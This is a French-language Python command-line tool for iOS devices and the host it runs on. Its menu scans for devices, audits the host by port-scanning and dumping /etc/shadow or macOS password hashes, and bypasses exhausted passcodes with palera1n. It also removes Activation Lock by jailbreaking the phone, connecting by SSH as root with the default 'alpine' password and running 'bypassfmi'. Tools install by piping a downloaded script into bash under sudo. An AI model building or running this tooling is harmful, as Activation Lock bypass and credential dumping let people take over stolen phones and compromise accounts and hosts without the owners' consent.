#!/usr/bin/env python3
# ios.py — sorties 100% réelles, multi-système, installation à la demande

import os
import re
import sys
import shlex
import time
import socket
import shutil
import platform
import subprocess
import concurrent.futures
from pathlib import Path

VERSION = "5.1"

W = "\033[97m"
B = "\033[1m"
D = "\033[2m"
R = "\033[0m"

LOGO = r"""
                ██████
                ████████
                ██████
                ████
      ██████████  ██████████
    ██████████████████████████
  ██████████████████████████████
  ████████████████████████
  ██████████████████████
  ████████████████████████
  ██████████████████████████
  ██████████████████████████
  ██████████████████████████████
    ██████████████████████████
    ██████████████████████████
      ██████████  ██████████
        ██████      ██████
"""

IS_WIN = os.name == "nt"
IS_LINUX = sys.platform.startswith("linux")
IS_MAC = sys.platform == "darwin"
OS_LABEL = "Windows" if IS_WIN else ("macOS" if IS_MAC else
                                     ("Linux" if IS_LINUX else platform.system()))

INTERACTIVE = sys.stdin.isatty()
ASSUME_YES = False
_SUDO_CACHE = None


# ---------------------------------------------------------------- utilitaires

def clear():
    os.system("cls" if IS_WIN else "clear")


def out(txt=""):
    print(txt)
    sys.stdout.flush()


def ok(msg):
    out(f"{W}  ✔ {msg}{R}")


def bad(msg):
    out(f"{W}  ✖ {msg}{R}")


def note(msg):
    out(f"{D}    {msg}{R}")


def pause(force=False):
    if ASSUME_YES and not force:
        return
    if not INTERACTIVE:
        if force:
            time.sleep(1.5)
        return
    try:
        input(f"{D}  [ Entrée ]{R}")
    except (EOFError, KeyboardInterrupt):
        pass


def ask(prompt, default=""):
    if not INTERACTIVE:
        return default
    sys.stdout.write(prompt)
    sys.stdout.flush()
    try:
        return input()
    except (EOFError, KeyboardInterrupt):
        return default


def confirm(token):
    if ASSUME_YES:
        return True
    return ask("  > ").strip().upper() == token


def run(cmd, timeout=6):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=timeout, errors="replace")
        return p.returncode, (p.stdout + p.stderr).strip()
    except FileNotFoundError:
        return 127, f"binaire introuvable : {cmd[0]}"
    except subprocess.TimeoutExpired:
        return 124, "délai dépassé"
    except Exception as e:
        return 1, repr(e)


def run_ps(script, timeout=25):
    if not IS_WIN:
        return 127, "PowerShell hors Windows"
    return run(["powershell", "-NoProfile", "-NonInteractive",
                "-ExecutionPolicy", "Bypass", "-Command", script], timeout)


def have(bin_name):
    return shutil.which(bin_name) is not None


def is_root():
    if IS_WIN:
        try:
            import ctypes
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False
    return hasattr(os, "geteuid") and os.geteuid() == 0


def sudo_nopass():
    global _SUDO_CACHE
    if _SUDO_CACHE is None:
        if IS_WIN:
            _SUDO_CACHE = is_root()
        else:
            code, _ = run(["sudo", "-n", "true"], timeout=4)
            _SUDO_CACHE = code == 0
    return _SUDO_CACHE


def priv(interactive=False):
    if IS_WIN or is_root() or not have("sudo"):
        return []
    return ["sudo"] if interactive else ["sudo", "-n"]


def run_priv(cmd, timeout=6):
    return run(priv() + cmd, timeout)


def head(txt, n=6, width=110):
    for line in (txt or "").splitlines()[:n]:
        note(line[:width])


def net_ok(host, port=443, timeout=4):
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return True
    except OSError:
        return False


# --------------------------------------------------------- dépendances

PKG = {
    "idevice_id": {
        "debian": ["libimobiledevice-utils"], "arch": ["libimobiledevice"],
        "fedora": ["libimobiledevice"], "suse": ["libimobiledevice"],
        "alpine": ["libimobiledevice"], "brew": ["libimobiledevice"],
        "winget": ["Apple.iTunes"], "choco": ["libimobiledevice"],
    },
    "irecovery": {
        "debian": ["libirecovery-utils"], "arch": ["libirecovery"],
        "fedora": ["libirecovery"], "brew": ["libirecovery"],
        "choco": ["libirecovery"],
    },
    "idevicerestore": {
        "debian": ["idevicerestore"], "brew": ["idevicerestore"],
        "choco": ["idevicerestore"],
    },
    "iproxy": {
        "debian": ["libusbmuxd-tools"], "arch": ["libusbmuxd"],
        "fedora": ["libusbmuxd-utils"], "brew": ["libusbmuxd"],
        "choco": ["libusbmuxd"],
    },
    "sshpass": {
        "debian": ["sshpass"], "arch": ["sshpass"], "fedora": ["sshpass"],
        "suse": ["sshpass"], "alpine": ["sshpass"],
        "brew": ["hudochenkov/sshpass/sshpass"], "choco": ["sshpass"],
    },
    "ss": {"debian": ["iproute2"], "arch": ["iproute2"],
           "fedora": ["iproute"], "alpine": ["iproute2"]},
    "lsof": {"debian": ["lsof"], "arch": ["lsof"], "fedora": ["lsof"],
             "suse": ["lsof"], "alpine": ["lsof"], "brew": ["lsof"]},
}
for _t in ("ideviceinfo", "idevicepair", "idevicebackup2",
           "ideviceenterrecovery", "idevicediagnostics", "ideviceactivation"):
    PKG[_t] = {
        "debian": ["libimobiledevice-utils"], "brew": ["libimobiledevice"],
        "choco": ["libimobiledevice"],
    }

SCRIPTS = {"palera1n": "https://palera.in"}

HINTS = {
    "debian": "sudo apt install", "arch": "sudo pacman -S",
    "fedora": "sudo dnf install", "suse": "sudo zypper install",
    "alpine": "sudo apk add", "brew": "brew install",
    "winget": "winget install", "choco": "choco install",
}

CORE_TOOLS = ["idevice_id", "ideviceinfo", "idevicepair",
              "idevicediagnostics", "ideviceenterrecovery",
              "idevicebackup2", "ideviceactivation"]
BYPASS_TOOLS = ["iproxy", "sshpass"]
if not IS_WIN:
    CORE_TOOLS.append("irecovery")
CORE_TOOLS += ["ss"] if IS_LINUX else (["lsof"] if IS_MAC else [])


def _pm():
    if IS_MAC:
        return "brew" if have("brew") else None
    if IS_WIN:
        for binary in ("winget", "choco"):
            if have(binary):
                return binary
        return None
    for binary, name in (("apt-get", "debian"), ("pacman", "arch"),
                         ("dnf", "fedora"), ("zypper", "suse"),
                         ("apk", "alpine")):
        if have(binary):
            return name
    return None


def _ask(prompt):
    if ASSUME_YES:
        return True
    return ask(prompt).strip().lower() in ("o", "oui", "y", "yes")


def tool_ok(tool):
    return have(tool) or _wsl_have(tool)


def install_hint(tool):
    if tool in SCRIPTS:
        if IS_WIN:
            return f"wsl -e bash -lc \"curl -fsSL {SCRIPTS[tool]} | bash\""
        return f"curl -fsSL {SCRIPTS[tool]} | bash"
    pm = _pm()
    packages = PKG.get(tool, {}).get(pm) if pm else None
    if not packages:
        return "aucune commande connue pour cette plateforme"
    return f"{HINTS[pm]} {' '.join(packages)}"


def _wsl_have(binary):
    if not (IS_WIN and have("wsl")):
        return False
    code, _ = run(["wsl", "-e", "bash", "-lc", f"command -v {binary}"], 20)
    return code == 0


def install_one(tool):
    if tool_ok(tool):
        return True

    if tool in SCRIPTS:
        if IS_WIN:
            if not have("wsl"):
                note("palera1n exige WSL : wsl --install")
                return False
            cmd = ["wsl", "-e", "bash", "-lc",
                   f"curl -fsSL {SCRIPTS[tool]} | bash"]
        else:
            cmd = priv(interactive=True) + \
                ["bash", "-lc", f"curl -fsSL {SCRIPTS[tool]} | bash"]
        note(f"$ {' '.join(cmd)}")
        try:
            subprocess.run(cmd, timeout=1200)
        except Exception as e:
            bad(repr(e))
            return False
        return tool_ok(tool)

    pm = _pm()
    packages = PKG.get(tool, {}).get(pm) if pm else None
    if not packages:
        return False
    base = priv(interactive=True)
    if pm == "debian":
        subprocess.run(base + ["apt-get", "update", "-qq"], timeout=600)
        cmd = base + ["apt-get", "install", "-y"] + packages
    elif pm == "arch":
        cmd = base + ["pacman", "-S", "--noconfirm", "--needed"] + packages
    elif pm == "fedora":
        cmd = base + ["dnf", "install", "-y"] + packages
    elif pm == "suse":
        cmd = base + ["zypper", "install", "-y"] + packages
    elif pm == "alpine":
        cmd = base + ["apk", "add"] + packages
    elif pm == "brew":
        cmd = ["brew", "install"] + packages
    elif pm == "winget":
        cmd = ["winget", "install", "--accept-package-agreements",
               "--accept-source-agreements"] + packages
    elif pm == "choco":
        cmd = ["choco", "install", "-y"] + packages
    else:
        return False
    note(f"$ {' '.join(cmd)}")
    try:
        subprocess.run(cmd, timeout=1800)
    except Exception as e:
        bad(repr(e))
        return False
    return tool_ok(tool)


def require(*tools):
    for tool in tools:
        if tool_ok(tool):
            continue
        bad(f"{tool} requis")
        note(install_hint(tool))
        if not _ask(f"  installer {tool} maintenant ? [o/n] > "):
            return False
        if install_one(tool):
            ok(f"{tool} installé")
        else:
            bad(f"installation de {tool} impossible")
            return False
    return True


def preflight(include_bypass=False):
    wanted = list(CORE_TOOLS) + (BYPASS_TOOLS if include_bypass else [])
    missing = [t for t in wanted if not tool_ok(t)]
    if not missing:
        ok(f"chaîne d'outils complète ({OS_LABEL})")
        return True

    out(f"{W}  {len(missing)} outil(s) manquant(s){R}\n")
    for tool in missing:
        bad(tool)
        note(install_hint(tool))
    out()

    if not INTERACTIVE and not ASSUME_YES:
        note("mode non interactif : relance avec --yes ou « ios.py install »")
        return False

    for tool in list(missing):
        if _ask(f"  installer {tool} maintenant ? [o/n] > "):
            if install_one(tool):
                ok(f"{tool} installé")
                missing.remove(tool)
            else:
                bad(f"échec pour {tool}")

    if missing:
        bad(f"toujours manquants : {', '.join(missing)}")
        return False
    ok("chaîne complète — poursuite")
    return True


# --------------------------------------------------------- lanceur de chaîne

def _wrap(args):
    if not IS_WIN:
        return args
    if not have("wsl"):
        return None
    return ["wsl", "-e", "bash", "-lc", " ".join(shlex.quote(a) for a in args)]


def wsl_run(args, timeout=120):
    cmd = _wrap(args)
    if cmd is None:
        return 127, "wsl absent"
    return run(cmd, timeout)


def palera1n_run(args, timeout=1800):
    if have("palera1n"):
        return run(priv(interactive=True) + ["palera1n"] + args, timeout)
    if _wsl_have("palera1n"):
        return wsl_run(["sudo", "palera1n"] + args, timeout)
    return 127, "palera1n absent (natif et WSL)"


def iproxy_start(port=2222, udid=None):
    args = ["iproxy", str(port), "22"] + ([udid] if udid else [])
    if IS_WIN:
        cmd = _wrap(args)
        if cmd is None:
            return None
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
    else:
        if not have("iproxy"):
            return None
        p = subprocess.Popen(args, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
    time.sleep(2)
    return p


def ssh_ready(port=2222, tries=15):
    for _ in range(tries):
        with socket.socket() as s:
            s.settimeout(1)
            if s.connect_ex(("127.0.0.1", port)) == 0:
                return True
        time.sleep(2)
    return False


def ssh_exec(command, port=2222, timeout=180):
    args = ["ssh", "-p", str(port), "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            "-o", "ConnectTimeout=8", "root@127.0.0.1", command]
    if have("sshpass") or _wsl_have("sshpass"):
        if IS_WIN:
            return wsl_run(["sshpass", "-p", "alpine"] + args, timeout)
        return run(["sshpass", "-p", "alpine"] + args, timeout)
    return wsl_run(args, timeout) if IS_WIN else run(args, timeout)


# --------------------------------------------------------------- bannière

def banner():
    clear()
    out(f"{W}{B}")
    for line in LOGO.splitlines():
        out(line)
    out(f"{R}")
    out(f"{W}  create by wardroque // IOS v1.0")
    out(f"{D}  hôte : {platform.node() or 'inconnu'}   "
        f"os : {OS_LABEL} {platform.release()}{R}")
    if not is_root() and not sudo_nopass():
        out(f"{D}  privilèges : limités{R}")
    out(f"{D}  ──────────────────────────────────────────────────{R}")
    out()


# --------------------------------------------------------- 1. iOS

APPLE_PID = {
    "1281": "mode Recovery", "1227": "mode DFU",
    "12a8": "mode normal (appareil monté)",
    "12a0": "mode normal", "12ab": "mode normal", "1338": "mode WTF",
}

CHECKM8_MODELS = {
    "iPhone6,1", "iPhone6,2", "iPhone7,1", "iPhone7,2",
    "iPhone8,1", "iPhone8,2", "iPhone8,4",
    "iPhone9,1", "iPhone9,2", "iPhone9,3", "iPhone9,4",
    "iPhone10,1", "iPhone10,2", "iPhone10,3",
    "iPhone10,4", "iPhone10,5", "iPhone10,6",
}

FACEID_DFU = {"iPhone10,3", "iPhone10,6", "iPhone11,2", "iPhone11,4",
              "iPhone11,6", "iPhone11,8", "iPhone12,1", "iPhone12,3",
              "iPhone12,5", "iPhone12,8", "iPhone13,1", "iPhone13,2",
              "iPhone13,3", "iPhone13,4", "iPhone14,2", "iPhone14,3",
              "iPhone14,4", "iPhone14,5", "iPhone14,6", "iPhone14,7",
              "iPhone14,8", "iPhone15,2", "iPhone15,3", "iPhone15,4",
              "iPhone15,5", "iPhone16,1", "iPhone16,2"}
HOME_DFU = {"iPhone6,1", "iPhone6,2", "iPhone7,1", "iPhone7,2",
            "iPhone8,1", "iPhone8,2", "iPhone8,4", "iPhone9,1",
            "iPhone9,2", "iPhone9,3", "iPhone9,4", "iPhone10,1",
            "iPhone10,2", "iPhone10,4", "iPhone10,5"}

PID_RE = re.compile(r"PID_([0-9A-Fa-f]{4})")


def apple_usb_scan():
    found = []
    if IS_LINUX:
        base = Path("/sys/bus/usb/devices")
        if base.is_dir():
            for d in base.iterdir():
                try:
                    if (d / "idVendor").read_text().strip() != "05ac":
                        continue
                    found.append((d.name, (d / "idProduct").read_text().strip()))
                except (OSError, ValueError):
                    continue
        if not found and have("lsusb"):
            code, txt = run(["lsusb"], timeout=8)
            if code == 0:
                for line in txt.splitlines():
                    if "05ac:" in line.lower():
                        found.append(("lsusb", line.lower().split("05ac:")[-1][:4]))
    elif IS_MAC:
        code, txt = run(["system_profiler", "SPUSBDataType"], timeout=25)
        if code == 0:
            for line in txt.splitlines():
                s = line.strip()
                if s.startswith("Product ID:"):
                    pid = s.split("0x")[-1].strip().lower()
                    if pid in APPLE_PID:
                        found.append(("usb", pid))
    elif IS_WIN:
        code, txt = run_ps("Get-PnpDevice -PresentOnly | "
                           "Where-Object { $_.InstanceId -match 'VID_05AC' } | "
                           "ForEach-Object { $_.InstanceId }", timeout=25)
        if code == 0:
            for line in txt.splitlines():
                m = PID_RE.search(line)
                if m:
                    found.append(("pnp", m.group(1).lower()))
    return found


def first_udid():
    if not have("idevice_id"):
        return None
    code, txt = run(["idevice_id", "-l"])
    if code != 0:
        return None
    for line in txt.splitlines():
        if line.strip():
            return line.strip()
    return None


def device_facts(udid):
    facts = {"udid": udid}
    for key, label in (("ProductType", "model"),
                       ("ProductVersion", "ios"),
                       ("PasswordProtected", "protected")):
        code, txt = run(["ideviceinfo", "-u", udid, "-k", key])
        facts[label] = txt if code == 0 else None
    return facts


def recovery_facts():
    if not tool_ok("irecovery"):
        return None
    code, txt = run_priv(["irecovery", "-q"])
    if code != 0:
        return None
    facts = {}
    for line in txt.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            facts[k.strip().upper()] = v.strip()
    return facts or None


def cmd_scan():
    banner()
    out(f"{D}  couche USB lue sur : {OS_LABEL}{R}\n")
    devices = apple_usb_scan()
    if not devices:
        note("aucun périphérique Apple sur le bus USB")
    for dev, pid in devices:
        note(f"{dev} → PID 0x{pid} : {APPLE_PID.get(pid, 'inconnu')}")

    out(f"\n{W}  · libimobiledevice{R}")
    if not require("idevice_id"):
        return 2

    code, txt = run(["idevice_id", "-l"])
    udids = [u for u in txt.splitlines() if u.strip()] if code == 0 else []
    if not udids:
        bad(f"aucun appareil appairé (code {code})")
        if devices:
            note("appareil présent mais non monté : déverrouille et appuie")
            note("sur « Faire confiance »")
        return 1
    for udid in udids:
        ok(f"appareil : {udid}")
        for key, label in (("ProductType", "modèle"),
                           ("ProductVersion", "iOS"),
                           ("BuildVersion", "build")):
            code, info = run(["ideviceinfo", "-u", udid, "-k", key])
            if code == 0:
                note(f"{label:<7}: {info}")
        code, _ = run(["idevicepair", "-u", udid, "validate"])
        if code == 0:
            ok("appairage valide")
        else:
            bad(f"appairage invalide : idevicepair -u {udid} pair")
    return 0


# --------------------------------------------------------- 2. hôte

PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 587, 993, 995,
         1433, 3000, 3306, 3389, 5000, 5432, 5900, 6379, 8000, 8080,
         8443, 9000, 27017]


def probe(host, port, timeout=0.5):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(timeout)
        try:
            return port, s.connect_ex((host, port)) == 0
        except OSError:
            return port, False


def scan_ports(host="127.0.0.1"):
    out(f"{W}  · scan TCP réel sur {host}{R}")
    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=32) as ex:
        for f in concurrent.futures.as_completed(
                [ex.submit(probe, host, p) for p in PORTS]):
            port, up = f.result()
            if up:
                found.append(port)
                try:
                    svc = socket.getservbyport(port)
                except OSError:
                    svc = "?"
                ok(f"port {port} ouvert ({svc})")
    if not found:
        note("aucun port ouvert")
    return sorted(found)


def _read(path, limit=4000):
    try:
        return Path(path).read_text(errors="replace")[:limit]
    except OSError:
        return None


def local_info():
    out(f"{W}  · hôte réel{R}")
    note(f"hostname : {platform.node()}")
    note(f"os       : {OS_LABEL} {platform.release()} {platform.machine()}")
    note(f"python   : {platform.python_version()}")
    note(f"cpu      : {os.cpu_count()} cœurs")
    if IS_LINUX:
        for line in (_read("/etc/os-release") or "").splitlines():
            if line.startswith("PRETTY_NAME="):
                note(f"distribution : {line.split('=', 1)[1].strip(chr(34))}")
        if hasattr(os, "getloadavg"):
            note("load       : %.2f %.2f %.2f" % os.getloadavg())
    elif IS_MAC:
        code, txt = run(["sw_vers"], timeout=8)
        if code == 0:
            for line in txt.splitlines():
                note(line.replace(":", " :"))
    elif IS_WIN:
        for script, label in (
                ("(Get-CimInstance Win32_OperatingSystem).Caption", "édition"),
                ("(Get-CimInstance Win32_Processor).Name", "processeur")):
            code, txt = run_ps(script, 15)
            if code == 0 and txt.strip():
                note(f"{label} : {txt.strip().splitlines()[0]}")


def privileges():
    out(f"{W}  · privilèges réels{R}")
    if is_root():
        ok("déjà élevé")
        return True
    if IS_WIN:
        bad("session non élevée")
        return False
    note(f"uid réel : {os.getuid()}")
    if sudo_nopass():
        ok("sudo sans mot de passe")
        return True
    bad("sudo exige un mot de passe")
    return False


def listeners():
    out(f"{W}  · sockets en écoute réelles{R}")
    if IS_WIN:
        code, txt = run(["netstat", "-ano", "-p", "TCP"], timeout=15)
        rows = [l for l in (txt or "").splitlines() if "LISTENING" in l.upper()]
        if code != 0 or not rows:
            note("rien à afficher")
            return
        head("\n".join(rows), 15)
        return
    if have("ss") and IS_LINUX:
        code, txt = run(["ss", "-tlnp"])
    elif have("lsof"):
        code, txt = run(["lsof", "-nP", "-iTCP", "-sTCP:LISTEN"])
    else:
        note("ni ss ni lsof installé")
        return
    if code != 0 or not txt:
        note("rien à afficher")
        return
    head(txt, 15)


def processes():
    out(f"{W}  · processus réels (top 8 CPU){R}")
    if IS_WIN:
        code, txt = run_ps("Get-Process | Sort-Object CPU -Descending | "
                           "Select-Object -First 8 Id,ProcessName,CPU | "
                           "Format-Table -AutoSize | Out-String -Width 110", 25)
        if code != 0:
            code, txt = run(["tasklist"], timeout=15)
    elif IS_MAC:
        code, txt = run(["ps", "-Ao", "pid,user,pcpu,comm", "-r"], timeout=10)
    else:
        code, txt = run(["ps", "-eo", "pid,user,pcpu,comm", "--sort=-pcpu"], 10)
    if code != 0:
        bad("liste indisponible")
        return
    head(txt, 9)


def cred_dump():
    out(f"{W}  · secrets locaux réels{R}")
    if not is_root() and not sudo_nopass():
        bad("droits insuffisants")
        return
    if IS_LINUX:
        if not os.path.exists("/etc/shadow"):
            bad("/etc/shadow absent")
            return
        code, txt = run_priv(["cat", "/etc/shadow"])
        if code != 0:
            bad("lecture impossible")
            return
        ok(f"{len(txt.splitlines())} entrées lues")
        head(txt, 5, 90)
    elif IS_MAC:
        code, txt = run_priv(["dscl", ".", "-list", "/Users"])
        if code != 0:
            bad("liste illisible")
            return
        users = [u for u in txt.splitlines() if u.strip() and not u.startswith("_")][:5]
        for u in users:
            code, txt = run_priv(["dscl", ".", "-read", f"/Users/{u}",
                                  "AuthenticationAuthority"])
            if code == 0 and txt:
                note(f"{u} :")
                for line in txt.splitlines():
                    if "ShadowHash" in line or "SALTED" in line:
                        note(f"  {line.strip()[:100]}")
    else:
        code, txt = run(["net", "user"], timeout=15)
        if code == 0:
            rows = [l.strip() for l in txt.splitlines()
                    if l.strip() and not l.startswith("-")]
            ok(f"{len(rows)} comptes locaux")
            for u in rows[:8]:
                note(u)
        code, txt = run(["whoami", "/priv"], timeout=15)
        if code == 0:
            head(txt, 6, 90)


def real_shell():
    out(f"{W}  · shell interactif réel (exit pour revenir){R}\n")
    shell = os.environ.get("COMSPEC", "cmd") if IS_WIN else \
        (os.environ.get("SHELL") or "/bin/sh")
    try:
        subprocess.call([shell])
    except Exception as e:
        bad(repr(e))


def cmd_sys():
    banner()
    local_info()
    out()
    elevated = privileges()
    out()
    scan_ports("127.0.0.1")
    out()
    listeners()
    out()
    processes()
    out()
    if elevated:
        cred_dump()
    else:
        note("secrets système : droits insuffisants")
    out()
    out(f"{D}  ──────────────────────────────────────────────────{R}")
    out(f"  {W}[s]{R} shell réel   {W}[Entrée]{R} menu")
    if ask("  > ").strip().lower() == "s":
        real_shell()
    return 0


# --------------------------------------------------------- 3. passcode

def dfu_sequence(model):
    if model in FACEID_DFU:
        return ["appui bref volume +", "appui bref volume -",
                "maintiens le bouton latéral jusqu'à l'écran noir",
                "sans lâcher le latéral, maintiens aussi volume - pendant 5 s",
                "lâche le latéral, garde volume - encore 10 s"]
    if model in HOME_DFU:
        if model.startswith("iPhone9"):
            return ["maintiens volume - + bouton latéral pendant 10 s",
                    "lâche le latéral, garde volume - encore 10 s"]
        return ["maintiens le bouton home + latéral pendant 10 s",
                "lâche le latéral, garde home encore 10 s"]
    return ["appui bref volume +", "appui bref volume -",
            "maintiens le bouton latéral jusqu'à l'écran noir",
            "sans lâcher le latéral, maintiens aussi volume - pendant 5 s",
            "lâche le latéral, garde volume - encore 10 s"]


def cmd_unlock():
    banner()
    out(f"{W}{B}  [3] APPAREIL VERROUILLÉ — PASSCODE ÉPUISÉ{R}\n")

    if not require("idevice_id", "ideviceinfo"):
        return 2

    rec = recovery_facts()
    if rec:
        for k in ("MODE", "CPID", "BDID", "MODEL", "ECID"):
            if k in rec:
                note(f"{k} = {rec[k]}")
        vulnerable = (rec.get("CPID", "").lower() in
                      {"0x8010", "0x8011", "0x8012", "0x8015"} or
                      rec.get("MODEL", "") in CHECKM8_MODELS)
        (ok if vulnerable else bad)(
            "checkm8 : bypass sans effacement" if vulnerable
            else "puce A12+ : restauration obligatoire")
        if ask("  [n] redémarrer en mode normal > ").strip().lower() == "n":
            code, txt = run_priv(["irecovery", "-n"])
            (ok if code == 0 else bad)(
                "redémarrage demandé" if code == 0 else txt[:80])
            return 0 if code == 0 else 1

    udid = first_udid()
    if not udid:
        bad("appareil non détecté en mode normal")
        note("vérifie d'abord le code : un essai correct remet le compteur à zéro")
        note("sinon : passe en Recovery puis restauration")
        return 1

    facts = device_facts(udid)
    note(f"modèle : {facts.get('model')}")
    note(f"iOS    : {facts.get('ios')}")
    vulnerable = facts.get("model") in CHECKM8_MODELS

    out(f"\n{W}  · sauvegarde locale réelle{R}")
    if _ask("  lancer idevicebackup2 ? [o/n] > "):
        code, txt = run(["idevicebackup2", "-u", udid, "backup",
                         os.path.expanduser("~/ios-backup")], timeout=1800)
        (ok if code == 0 else bad)(
            "sauvegarde terminée" if code == 0 else txt[:100])

    out(f"\n{W}  · déblocage{R}")
    if vulnerable:
        ok("checkm8 : bypass possible, données conservées")
        if _ask("  lancer palera1n -c -f ? [o/n] > "):
            if require("palera1n"):
                code, txt = palera1n_run(["-c", "-f"], timeout=1800)
                (ok if code == 0 else bad)(
                    "palera1n exécuté" if code == 0 else txt[-120:])
    else:
        bad("pas de bypass sans effacement sur cette puce")
        note("enchaîne sur : ios.py reset restore")

    out(f"\n{W}  · restauration (efface les données){R}")
    if _ask("  passer en Recovery maintenant ? [o/n] > "):
        code, txt = run(["ideviceenterrecovery", udid])
        (ok if code == 0 else bad)(
            "appareil en Recovery" if code == 0 else txt[:80])
    return 0


# --------------------------------------------------------- 4. verrou

def cmd_lock():
    banner()
    out(f"{W}{B}  [4] NEUTRALISER LE VERROU D'ACTIVATION{R}\n")

    if not require("idevice_id", "ideviceinfo", "ideviceactivation"):
        return 2

    udid = first_udid()
    if not udid:
        bad("appareil non détecté")
        return 1

    facts = device_facts(udid)
    note(f"modèle : {facts.get('model')}")
    note(f"iOS    : {facts.get('ios')}")
    if facts.get("model") not in CHECKM8_MODELS:
        bad("puce A12+ : mot de passe Apple ID obligatoire")
        note("réglages → ton nom → Localiser → Localiser mon iPhone → OFF")
        return 1

    code, txt = run(["ideviceactivation", "state"])
    note(f"activation : {(txt or 'illisible').splitlines()[0][:90]}")

    ok("puce checkm8 : chaîne complète disponible")
    if not _ask("  poser le jailbreak puis couper le verrou ? [o/n] > "):
        return 0

    out(f"\n{W}  1/4 jailbreak rootless{R}")
    if not require("palera1n"):
        return 2
    code, txt = palera1n_run(["-l"], timeout=1800)
    if code != 0:
        bad(f"palera1n a échoué (code {code})")
        note(txt[-140:])
        return 1
    ok("jailbreak posé")

    out(f"\n{W}  2/4 tunnel SSH via iproxy{R}")
    if not require("iproxy", "sshpass"):
        return 2
    proc = iproxy_start(2222, udid)
    if proc is None:
        bad("iproxy n'a pas démarré")
        return 2
    try:
        if not ssh_ready(2222):
            bad("SSH ne répond pas (appareil déverrouillé ? palera1n terminé ?)")
            return 1
        ok("tunnel établi")

        out(f"\n{W}  3/4 outil de bypass{R}")
        code, txt = ssh_exec("command -v bypassfmi", timeout=30)
        if code != 0 or not txt.strip():
            bad("bypassfmi absent sur l'appareil")
            note("ouvre Sileo sur l'appareil, installe « bypassfmi », relance")
            return 1

        code, txt = ssh_exec("bypassfmi", timeout=600)
        if code != 0:
            bad(f"bypassfmi a échoué (code {code})")
            note(txt[-140:])
            return 1
        ok("bypass appliqué")

        out(f"\n{W}  4/4 vérification réelle{R}")
        ssh_exec("fmi off 2>/dev/null || true", timeout=120)
        time.sleep(3)
        code, txt = run(["ideviceactivation", "state"])
        if code == 0 and "activated" in txt.lower() and "un" not in txt.lower():
            ok("appareil activé sans Apple ID")
            return 0
        bad("état non activé")
        note("redémarre l'appareil puis relance la vérification")
        return 1
    finally:
        try:
            proc.terminate()
        except Exception:
            pass


# --------------------------------------------------------- 5. réinitialisation

def diag(action, udid):
    return run(["idevicediagnostics", "-u", udid, action])


def battery(udid):
    code, txt = run(["ideviceinfo", "-u", udid, "-k", "BatteryCurrentCapacity"])
    return int(txt.strip()) if code == 0 and txt.strip().isdigit() else None


def cmd_reset(action=None):
    banner()
    out(f"{W}{B}  [5] RÉINITIALISATION{R}\n")

    if not require("idevice_id", "ideviceinfo"):
        return 2

    udid = first_udid()
    if not udid:
        bad("appareil non détecté en mode normal")
        return 1

    facts = device_facts(udid)
    note(f"modèle : {facts.get('model')}")
    note(f"iOS    : {facts.get('ios')}")
    lvl = battery(udid)
    if lvl is not None:
        note(f"batterie : {lvl} %")
        if lvl < 20:
            bad("charge insuffisante — branche l'appareil")
    out()

    if not action:
        out(f"  {W}[r]{R} redémarrer      {W}[s]{R} éteindre")
        out(f"  {W}[e]{R} effacer réglages {W}[R]{R} restaurer")
        out(f"  {W}[d]{R} mode DFU        {W}[Entrée]{R} menu")
        action = ask("  > ").strip()
    action = {"r": "restart", "s": "shutdown", "e": "erase",
              "R": "restore", "d": "dfu"}.get(action, action)

    if action in ("restart", "shutdown"):
        code, txt = diag(action, udid)
        (ok if code == 0 else bad)(
            f"{action} demandé" if code == 0 else txt[:90])
        return 0 if code == 0 else 1

    if action == "erase":
        note("efface réglages et données, conserve l'iOS en place")
        note("échoue si le code est exigé au démarrage")
        if not confirm("EFFACER"):
            note("annulé")
            return 0
        code, txt = diag("erase", udid)
        if code == 0:
            ok("effacement lancé — 5 à 15 minutes")
            return 0
        bad(f"refusé (code {code})")
        note(txt.splitlines()[0][:100] if txt else "pas de détail")
        note("repli réel : ios.py reset restore")
        return 1

    if action == "restore":
        if not net_ok("updates.cdn-apple.com"):
            bad("pas d'accès au CDN Apple — restauration impossible")
            return 1
        if not require("idevicerestore"):
            return 2
        note("télécharge le firmware signé puis efface — 15 à 40 minutes")
        if not confirm("RESTAURER"):
            note("annulé")
            return 0
        code, txt = run(["idevicerestore", "-e", udid], timeout=3600)
        if code == 0:
            ok("restauration terminée")
            note("si Localiser était actif, l'Apple ID est encore exigé")
            note("→ ios.py lock")
            return 0
        bad(f"échec (code {code})")
        note(txt[-160:])
        return 1

    if action == "dfu":
        note("branche l'appareil en USB, puis :")
        for step in dfu_sequence(facts.get("model") or ""):
            note(step)
        out()
        note("écran noir = DFU. Contrôle :")
        if not require("irecovery"):
            return 2
        code, txt = run_priv(["irecovery", "-q"])
        if code == 0 and "MODE" in txt:
            mode = txt.split("MODE:")[-1].splitlines()[0].strip()
            ok(f"mode réel : {mode}")
            return 0
        bad("pas de réponse — DFU non atteint")
        return 1

    bad(f"action inconnue : {action}")
    return 1


# --------------------------------------------------------------------- menu

MENU = [("1", "Détecter un iOS réellement", cmd_scan),
        ("2", "Auditer et contrôler cet hôte réellement", cmd_sys),
        ("3", "Débloquer un appareil au passcode épuisé", cmd_unlock),
        ("4", "Neutraliser le verrou d'activation", cmd_lock),
        ("5", "Réinitialiser / restaurer", lambda: cmd_reset(None)),
        ("d", "Vérifier les dépendances",
         lambda: preflight(True) and pause(force=True))]


def menu():
    banner()
    if not preflight():
        note("le menu reste utilisable ; les outils seront redemandés à l'usage")
        pause(force=True)

    try:
        while True:
            banner()
            udid = first_udid()
            out(f"{D}  idevice_id : {'présent' if tool_ok('idevice_id') else 'absent'}   "
                f"appareil : {udid or 'aucun'}{R}")
            out()
            for key, label, _ in MENU:
                out(f"  {W}[{key}]{R}  {label}")
            out(f"  {W}[0]{R}  Quitter")
            out()
            c = ask(f"{W}  > {R}").strip()
            if c == "0":
                clear()
                out(f"{W}  fin de session{R}\n")
                return 0
            for key, _, fn in MENU:
                if c == key:
                    fn()
